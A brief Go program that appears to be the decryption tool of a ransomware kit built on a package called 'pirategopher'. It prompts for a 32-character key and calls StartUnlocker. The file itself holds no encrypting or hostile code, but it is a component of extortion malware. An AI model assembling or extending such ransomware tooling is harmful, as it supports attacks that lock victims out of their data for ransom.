package main

import (
	"fmt"
	"github.com/spitfire55/pirategopher"
	"log"
)

func main() {
	var key string
	for {
		fmt.Println("Type your encryption key and press enter")
		_, err := fmt.Scanf("%s\n", &key)
		if err != nil {
			log.Fatal(err)
		}
		if len(key) != 32 {
			fmt.Println("Your decryption key must be 32 characters")
			continue
		}
		break
	}
	pirategopher.StartUnlocker(key)
}

